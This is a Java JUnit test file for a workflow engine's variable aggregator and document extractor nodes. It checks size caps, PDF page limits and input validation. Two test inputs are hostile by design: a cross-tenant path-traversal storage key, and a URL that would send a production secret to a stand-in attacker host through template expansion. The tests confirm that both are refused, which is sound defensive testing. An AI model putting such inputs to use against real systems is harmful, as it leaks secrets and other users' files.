package com.agenticai.core.workflow;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.agenticai.core.agents.tools.web.HttpRequestExecutor;
import com.agenticai.core.agents.tools.web.HttpRequestResult;
import com.agenticai.core.agents.tools.web.HttpRequestSpec;
import com.agenticai.core.knowledge.SidecarClient;
import com.agenticai.core.storage.FileStorageService;
import com.agenticai.core.workflow.WorkflowNodeExecutor.NodeExecutionResult;
import com.fasterxml.jackson.databind.JsonNode;
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** Variable aggregator and document extractor of {@link WorkflowAiNodeHandler}. */
class WorkflowAiNodeDocumentTest extends WorkflowAiNodeHandlerTestBase {

    // ------------------------------------------------------------------ variable_aggregator

    @Test
    void aggregatorPicksTheFirstNonEmptySource() {
        Map<String, Object> config = new HashMap<>();
        config.put(
                "sources",
                List.of(
                        "",
                        "  ",
                        "null",
                        "[]",
                        "{{ $node[\"Gone\"].x }}",
                        "second real value",
                        "third"));
        NodeExecutionResult r =
                handler(new FakeModel())
                        .executeVariableAggregator(
                                node("variable_aggregator", config), "the input");
        assertEquals("second real value", r.output());
        assertTrue(r.summary().contains("source #6"), r.summary());
        assertNull(r.branch());
    }

    @Test
    void aggregatorFallsBackToTheInputOrEmpty() {
        Map<String, Object> config = new HashMap<>();
        config.put("sources", List.of("", "{}"));
        assertEquals(
                "the input",
                handler(new FakeModel())
                        .executeVariableAggregator(node("variable_aggregator", config), "the input")
                        .output());
        config.put("fallback", "empty");
        assertEquals(
                "",
                handler(new FakeModel())
                        .executeVariableAggregator(node("variable_aggregator", config), "the input")
                        .output());
    }

    @Test
    void aggregatorNeverCallsAModelAndValidatesItsSources() {
        FakeModel model = new FakeModel();
        Map<String, Object> config = new HashMap<>();
        config.put("sources", List.of("a"));
        handler(model).executeVariableAggregator(node("variable_aggregator", config), "x");
        assertTrue(model.requests.isEmpty());
        assertTrue(
                WorkflowAiNodeHandler.validateConfig(node("variable_aggregator", config), MAPPER)
                        .isEmpty());
        assertFalse(
                WorkflowAiNodeHandler.validateConfig(node("variable_aggregator", Map.of()), MAPPER)
                        .isEmpty());
        assertFalse(
                WorkflowAiNodeHandler.validateConfig(
                                node("variable_aggregator", Map.of("sources", List.of(" "))),
                                MAPPER)
                        .isEmpty());
    }

    // ------------------------------------------------------------------ document_extractor

    @Test
    void documentExtractorReadsPlainTextFromTheNodeInputAndCapsCharacters() {
        Map<String, Object> config = new HashMap<>();
        config.put("format", "txt");
        config.put("maxChars", 600);
        String longText = "word ".repeat(400);
        NodeExecutionResult r =
                handler(new FakeModel())
                        .executeDocumentExtractor(node("document_extractor", config), longText);
        assertEquals("OK", r.status());
        assertTrue(
                r.output().endsWith(WorkflowDocumentText.TRUNCATION_MARKER),
                "truncated output carries the marker");
        assertEquals(600 + WorkflowDocumentText.TRUNCATION_MARKER.length(), r.output().length());
        assertTrue(r.summary().contains("truncated"), r.summary());
    }

    @Test
    void documentExtractorNodeCannotRaiseTheDeploymentCaps() {
        Map<String, Object> config = new HashMap<>();
        config.put("format", "txt");
        config.put("maxChars", 10_000_000);
        // deployment ceiling in this test is 60_000
        NodeExecutionResult r =
                handler(new FakeModel())
                        .executeDocumentExtractor(
                                node("document_extractor", config), "x".repeat(70_000));
        assertEquals(60_000 + WorkflowDocumentText.TRUNCATION_MARKER.length(), r.output().length());
    }

    @Test
    void documentExtractorCapsCsvRows() {
        Map<String, Object> config = new HashMap<>();
        config.put("format", "csv");
        config.put("maxRows", 3);
        NodeExecutionResult r =
                handler(new FakeModel())
                        .executeDocumentExtractor(
                                node("document_extractor", config), "h1,h2\n1,2\n3,4\n5,6\n7,8");
        assertEquals("h1,h2\n1,2\n3,4", r.output());
        assertTrue(r.summary().contains("truncated"), r.summary());
    }

    @Test
    void documentExtractorJsonOutputCarriesMetadata() throws Exception {
        Map<String, Object> config = new HashMap<>();
        config.put("format", "md");
        config.put("outputMode", "json");
        JsonNode out =
                json(
                        handler(new FakeModel())
                                .executeDocumentExtractor(
                                        node("document_extractor", config), "# Title\nbody")
                                .output());
        assertEquals("md", out.get("format").asText());
        assertEquals("text", out.get("source").asText());
        assertFalse(out.get("truncated").asBoolean());
        assertTrue(out.get("pages").isNull());
    }

    @Test
    void documentExtractorReadsAnUploadedPdfThroughTheKnowledgeExtractorWithAPageCap()
            throws Exception {
        byte[] pdf = WorkflowDocumentTextTest.pdfWithPages(5);
        FileStorageService storage = mock(FileStorageService.class);
        when(storage.size("chat-attachments/agent-1/file-1")).thenReturn((long) pdf.length);
        when(storage.get("chat-attachments/agent-1/file-1"))
                .thenReturn(new ByteArrayInputStream(pdf));
        SidecarClient sidecar = mock(SidecarClient.class);
        when(sidecar.extractText(anyString(), any(byte[].class)))
                .thenReturn("page text from the sidecar");

        Map<String, Object> config = new HashMap<>();
        config.put("source", "chat-attachments/agent-1/file-1");
        config.put("maxPages", 2);
        config.put("outputMode", "json");
        NodeExecutionResult r =
                handler(new FakeModel(), sidecar, storage, null, true)
                        .executeDocumentExtractor(node("document_extractor", config), "ignored");
        assertEquals("OK", r.status(), r.summary());
        JsonNode out = json(r.output());
        assertEquals("page text from the sidecar", out.get("text").asText());
        assertEquals(5, out.get("pages").asInt());
        assertTrue(out.get("truncated").asBoolean());
        assertEquals("pdf", out.get("format").asText());
        org.mockito.ArgumentCaptor<byte[]> sent = org.mockito.ArgumentCaptor.forClass(byte[].class);
        verify(sidecar).extractText(anyString(), sent.capture());
        assertEquals(
                2,
                WorkflowDocumentTextTest.pageCount(sent.getValue()),
                "only the first two pages reach the extractor");
    }

    @Test
    void documentExtractorRefusesOversizedStoredFilesBadKeysAndMissingServices() throws Exception {
        FileStorageService storage = mock(FileStorageService.class);
        when(storage.size("chat-attachments/a/big")).thenReturn(5_000_000L);
        Map<String, Object> tooBig = new HashMap<>();
        tooBig.put("source", "chat-attachments/a/big");
        NodeExecutionResult big =
                handler(new FakeModel(), null, storage, null, true)
                        .executeDocumentExtractor(node("document_extractor", tooBig), "x");
        assertEquals("SKIPPED", big.status());
        assertTrue(big.summary().contains("limit"), big.summary());
        verify(storage, never()).get(anyString());

        Map<String, Object> traversal = new HashMap<>();
        traversal.put("source", "chat-attachments/../other-tenant/file");
        NodeExecutionResult bad =
                handler(new FakeModel(), null, storage, null, true)
                        .executeDocumentExtractor(node("document_extractor", traversal), "x");
        assertEquals("SKIPPED", bad.status());
        assertTrue(bad.summary().contains("valid uploaded-file key"), bad.summary());

        Map<String, Object> noStorage = new HashMap<>();
        noStorage.put("source", "chat-attachments/a/b");
        assertEquals(
                "SKIPPED",
                handler(new FakeModel())
                        .executeDocumentExtractor(node("document_extractor", noStorage), "x")
                        .status());
    }

    @Test
    void documentExtractorRefusesPdfWithoutAnExtractorService() {
        FileStorageService storage = mock(FileStorageService.class);
        byte[] pdf = "%PDF-1.4 not really".getBytes(StandardCharsets.UTF_8);
        when(storage.size("chat-attachments/a/f")).thenReturn((long) pdf.length);
        when(storage.get("chat-attachments/a/f")).thenReturn(new ByteArrayInputStream(pdf));
        Map<String, Object> config = new HashMap<>();
        config.put("source", "chat-attachments/a/f");
        NodeExecutionResult r =
                handler(new FakeModel(), null, storage, null, true)
                        .executeDocumentExtractor(node("document_extractor", config), "x");
        assertEquals("SKIPPED", r.status());
        assertEquals("x", r.output(), "input is passed through on a skip");
        assertTrue(r.summary().contains("not available"), r.summary());
    }

    @Test
    void documentExtractorFetchesTextUrlsButNeverTemplatesOrBinaryDocuments() {
        HttpRequestExecutor http = mock(HttpRequestExecutor.class);
        HttpRequestResult page =
                new HttpRequestResult(
                        200,
                        "https://example.com/a",
                        Map.of(),
                        "text/html",
                        "<html><body>hello</body></html>",
                        false);
        when(http.execute(any(HttpRequestSpec.class), any())).thenReturn(page);
        SidecarClient sidecar = mock(SidecarClient.class);
        when(sidecar.extractText(anyString(), any(byte[].class))).thenReturn("hello");
        Map<String, Object> config = new HashMap<>();
        config.put("source", "https://example.com/a");
        NodeExecutionResult ok =
                handler(new FakeModel(), sidecar, null, http, true)
                        .executeDocumentExtractor(node("document_extractor", config), "x");
        assertEquals("OK", ok.status(), ok.summary());
        assertEquals("hello", ok.output());

        Map<String, Object> smuggled = new HashMap<>();
        smuggled.put("source", "https://attacker.example/{{secret.PROD_KEY}}");
        NodeExecutionResult refused =
                handler(new FakeModel(), sidecar, null, http, true)
                        .executeDocumentExtractor(node("document_extractor", smuggled), "x");
        assertEquals("SKIPPED", refused.status());
        assertTrue(refused.summary().contains("template reference"), refused.summary());

        HttpRequestResult binary =
                new HttpRequestResult(
                        200, "https://example.com/f", Map.of(), "application/pdf", "%PDF-", false);
        HttpRequestExecutor http2 = mock(HttpRequestExecutor.class);
        when(http2.execute(any(HttpRequestSpec.class), any())).thenReturn(binary);
        Map<String, Object> pdfUrl = new HashMap<>();
        pdfUrl.put("source", "https://example.com/f");
        NodeExecutionResult pdf =
                handler(new FakeModel(), sidecar, null, http2, true)
                        .executeDocumentExtractor(node("document_extractor", pdfUrl), "x");
        assertEquals("SKIPPED", pdf.status());
        assertTrue(pdf.summary().contains("binary"), pdf.summary());
    }

    @Test
    void documentExtractorUnpacksAJsonReferenceAndRejectsAnUnknownFormat() {
        Map<String, Object> config = new HashMap<>();
        NodeExecutionResult text =
                handler(new FakeModel())
                        .executeDocumentExtractor(
                                node("document_extractor", config),
                                "{\"text\":\"hello there\",\"fileName\":\"notes.txt\"}");
        assertEquals("hello there", text.output());

        NodeExecutionResult none =
                handler(new FakeModel())
                        .executeDocumentExtractor(
                                node("document_extractor", Map.of("source", "{}")), "x");
        assertEquals("SKIPPED", none.status());

        assertFalse(
                WorkflowAiNodeHandler.validateConfig(
                                node("document_extractor", Map.of("format", "rtf")), MAPPER)
                        .isEmpty());
        assertTrue(
                WorkflowAiNodeHandler.validateConfig(
                                node("document_extractor", Map.of("format", "pdf")), MAPPER)
                        .isEmpty());
    }

    @Test
    void documentExtractorDisabledDoesNothing() {
        NodeExecutionResult r =
                handler(new FakeModel(), null, null, null, false)
                        .executeDocumentExtractor(
                                node("document_extractor", Map.of("format", "txt")), "hello");
        assertEquals("SKIPPED", r.status());
        assertEquals("hello", r.output());
    }
}
